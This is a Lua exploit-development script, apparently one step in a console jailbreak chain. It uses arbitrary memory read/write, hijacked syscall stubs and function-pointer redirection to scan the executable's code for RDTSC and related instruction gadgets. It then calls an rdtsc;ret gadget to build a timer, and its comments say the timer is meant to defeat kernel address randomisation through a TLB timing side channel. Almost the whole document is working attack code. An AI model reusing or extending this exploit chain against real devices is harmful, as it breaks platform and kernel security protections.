-- CRASH_CLASS: LOW
-- PROBE 56h: Find RDTSC gadget in eboot for timing side channel
--
-- RDTSC opcode: 0F 31 (2 bytes)
-- Ideal gadget: rdtsc; ret (0F 31 C3) or rdtsc; shl rdx,32; or rax,rdx; ret
-- Even rdtsc alone before a ret is useful.
-- Also search for RDTSCP: 0F 01 F9
--
-- Additionally scan for: CPUID (0F A2) which serializes,
-- and LFENCE (0F AE E8) which is used in Spectre mitigations.
--
-- If we find RDTSC, we can measure syscall timing to detect
-- kernel page table walks (TLB miss vs hit → different times
-- for different kernel addresses → KASLR defeat).

print("=== PROBE 56h: RDTSC GADGET SEARCH ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local tlo = rd(N(info) + 0x108) or 0
local thi = rd(N(info) + 0x10C) or 0
if tlo < 0 then tlo = tlo + 0x100000000 end
if thi < 0 then thi = thi + 0x100000000 end
print(string.format("eboot=0x%X%08X", thi, tlo))

-- eboot text size from 56g2: 0x494000
local TEXT_SIZE = 0x494000
local CHUNK = 0x4000

-- Patterns to search:
-- RDTSC:   0F 31
-- RDTSCP:  0F 01 F9
-- CPUID:   0F A2
-- LFENCE:  0F AE E8

local results = {
    rdtsc = {},
    rdtscp = {},
    cpuid = {},
    lfence = {},
}

print(string.format("[1] Scanning eboot .text (%d KB) for timing gadgets", TEXT_SIZE / 1024))

for cs = 0, TEXT_SIZE - CHUNK, CHUNK do
    local dwords = {}
    local count = CHUNK / 4
    for i = 0, count - 1 do
        dwords[i] = rd(tlo + cs + i * 4) or 0
    end

    -- Extract bytes and search
    for i = 0, count - 2 do
        local d0 = dwords[i]
        local d1 = dwords[i + 1]
        local b = {}
        b[0] = d0 % 256
        b[1] = math.floor(d0 / 256) % 256
        b[2] = math.floor(d0 / 65536) % 256
        b[3] = math.floor(d0 / 16777216) % 256
        b[4] = d1 % 256
        b[5] = math.floor(d1 / 256) % 256
        b[6] = math.floor(d1 / 65536) % 256
        b[7] = math.floor(d1 / 16777216) % 256

        for s = 0, 5 do
            -- RDTSC: 0F 31
            if b[s] == 0x0F and b[s+1] == 0x31 then
                local off = cs + i * 4 + s
                if #results.rdtsc < 20 then
                    -- Read surrounding context (2 bytes before, 8 after)
                    local ctx = {}
                    for j = -2, 9 do
                        local addr_off = off + j
                        if addr_off >= 0 and addr_off < TEXT_SIZE then
                            local dw = rd(tlo + (addr_off - addr_off % 4))
                            if dw then
                                local shift = (addr_off % 4) * 8
                                ctx[#ctx + 1] = string.format("%02X", math.floor(dw / (2 ^ shift)) % 256)
                            end
                        end
                    end
                    results.rdtsc[#results.rdtsc + 1] = {off = off, ctx = table.concat(ctx, " ")}
                end
            end

            -- RDTSCP: 0F 01 F9
            if s <= 4 and b[s] == 0x0F and b[s+1] == 0x01 and b[s+2] == 0xF9 then
                local off = cs + i * 4 + s
                if #results.rdtscp < 20 then
                    local ctx = {}
                    for j = -2, 9 do
                        local addr_off = off + j
                        if addr_off >= 0 and addr_off < TEXT_SIZE then
                            local dw = rd(tlo + (addr_off - addr_off % 4))
                            if dw then
                                local shift = (addr_off % 4) * 8
                                ctx[#ctx + 1] = string.format("%02X", math.floor(dw / (2 ^ shift)) % 256)
                            end
                        end
                    end
                    results.rdtscp[#results.rdtscp + 1] = {off = off, ctx = table.concat(ctx, " ")}
                end
            end

            -- CPUID: 0F A2
            if b[s] == 0x0F and b[s+1] == 0xA2 then
                local off = cs + i * 4 + s
                if #results.cpuid < 10 then
                    results.cpuid[#results.cpuid + 1] = {off = off}
                end
            end

            -- LFENCE: 0F AE E8
            if s <= 4 and b[s] == 0x0F and b[s+1] == 0xAE and b[s+2] == 0xE8 then
                local off = cs + i * 4 + s
                if #results.lfence < 10 then
                    results.lfence[#results.lfence + 1] = {off = off}
                end
            end
        end
    end

    dwords = nil
    collectgarbage("collect")

    if cs % 0x80000 == 0 and cs > 0 then
        print(string.format("  ... scanned to +0x%X", cs + CHUNK))
    end
end

-- ============ RESULTS ============
print("")
print("[2] RDTSC hits: " .. #results.rdtsc)
for _, r in ipairs(results.rdtsc) do
    print(string.format("  eboot+0x%06X: %s", r.off, r.ctx))
end

print("")
print("[3] RDTSCP hits: " .. #results.rdtscp)
for _, r in ipairs(results.rdtscp) do
    print(string.format("  eboot+0x%06X: %s", r.off, r.ctx))
end

print("")
print("[4] CPUID hits: " .. #results.cpuid)
for _, r in ipairs(results.cpuid) do
    print(string.format("  eboot+0x%06X", r.off))
end

print("")
print("[5] LFENCE hits: " .. #results.lfence)
for _, r in ipairs(results.lfence) do
    print(string.format("  eboot+0x%06X", r.off))
end

-- ============ SECTION B: Test RDTSC if found ============
-- If we found rdtsc;ret or a usable gadget, try calling it
-- via CClosure redirect and reading the return value
if #results.rdtsc > 0 then
    print("")
    print("[6] Testing RDTSC gadgets via CClosure redirect")

    local re_s = tostring(rawequal)
    local re_a_str = re_s:match("0x([0-9a-fA-F]+)") or re_s:match(": ([0-9a-fA-F]+)$")
    local re_a = tonumber(re_a_str, 16)

    local function rq_addr(a)
        local ok, v = pcall(function() return memory.read_qword(a) end)
        if ok then return v end return nil
    end

    local function eaddr(off)
        return uint64(string.format("0x%X%08X", thi, tlo + off))
    end

    -- For each RDTSC hit, check if the bytes after it form a usable sequence
    -- We need rdtsc to execute and then return to the caller.
    -- The CClosure redirect mechanism: write gadget addr to +0x20, call function.
    -- rdi = lua_State*. The gadget executes, rax = return count.
    -- RDTSC puts low 32 bits in eax, high 32 bits in edx.
    -- So after rdtsc, eax = low TSC. If the next instruction is ret (C3),
    -- Lua interprets eax as return count (will be huge → may crash).
    -- Better: find rdtsc followed by xor eax,eax;ret or mov eax,1;ret

    for _, r in ipairs(results.rdtsc) do
        -- Check if followed within 10 bytes by C3 (ret)
        local has_ret = false
        local ret_dist = -1
        for j = 2, 10 do
            local dw = rd(tlo + r.off + (j - j % 4))
            if dw then
                local shift = (j % 4) * 8
                local b = math.floor(dw / (2 ^ shift)) % 256
                if b == 0xC3 then
                    has_ret = true
                    ret_dist = j
                    break
                end
            end
        end
        if has_ret then
            print(string.format("  +0x%06X: ret at +%d bytes — CALLABLE", r.off, ret_dist))
            -- Try calling it: rdtsc sets eax to TSC low bits (will be thousands+)
            -- This will make Lua think we returned thousands of values → likely crash
            -- Only safe if we can handle huge nret. Skip actual call for safety.
            print("    (skipping call — huge rax would crash Lua stack)")
        else
            print(string.format("  +0x%06X: no ret within 10 bytes", r.off))
        end
    end

    -- Alternative approach: use native.fcall_with_rax directly
    -- fcall_with_rax(addr, syscall_num) — calls addr with rdi=syscall_num
    -- If we point it at an rdtsc;ret gadget, the RETURN VALUE from
    -- fcall_with_rax is rax (= TSC low 32 bits). That's our timer!
    print("")
    print("[7] RDTSC via native.fcall_with_rax")

    for _, r in ipairs(results.rdtsc) do
        -- Check for ret within 6 bytes (clean short gadget)
        local ctx_bytes = {}
        for j = 0, 11 do
            local dw = rd(tlo + r.off + (j - j % 4))
            if dw then
                local shift = (j % 4) * 8
                ctx_bytes[j] = math.floor(dw / (2 ^ shift)) % 256
            else
                ctx_bytes[j] = 0
            end
        end

        -- Look for: 0F 31 C3 (rdtsc; ret)
        if ctx_bytes[2] == 0xC3 then
            local gadget_addr = eaddr(r.off)
            print(string.format("  Found rdtsc;ret at eboot+0x%06X — testing!", r.off))

            -- Call it 5 times, print TSC values
            for i = 1, 5 do
                local ok, tsc = pcall(function()
                    return N(native.fcall_with_rax(gadget_addr, 0))
                end)
                if ok then
                    print(string.format("    call %d: TSC_lo = %d (0x%X)", i, tsc, tsc))
                else
                    print(string.format("    call %d: FAILED", i))
                    break
                end
            end
            break  -- Only test first rdtsc;ret
        end
    end
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 56h COMPLETE ===")
